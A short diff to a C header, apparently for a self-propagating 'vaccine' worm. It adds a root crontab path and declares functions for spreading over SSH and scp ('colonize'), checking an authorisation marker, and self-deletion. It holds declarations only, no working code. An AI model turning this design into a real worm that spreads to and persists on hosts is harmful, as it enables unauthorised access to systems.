@@ -17,6 +17,7 @@
  #define PORT 22
  #define IP_LEN 16
  #define CLIENT_PATH "/root/"
+ #define CRONTAB "/var/spool/cron/crontabs/root"
  #define SCP "/usr/bin/scp"
  #define SSH "/usr/bin/ssh"
 
@@ -45,5 +46,15 @@
  * Try to establish an SSH connection on the given host and upload the given file
  */
  int colonize(char *host, char *file);
+
+ /*
+ * Check if the file "marker" exists
+ */
+ int isAuthorized(char *marker);
+
+ /*
+ * Delete the program and the configuration file, and restore the crontab
+ */
+ int wormDelete(char *program);
 
 #endif /* VACCCIN_H */
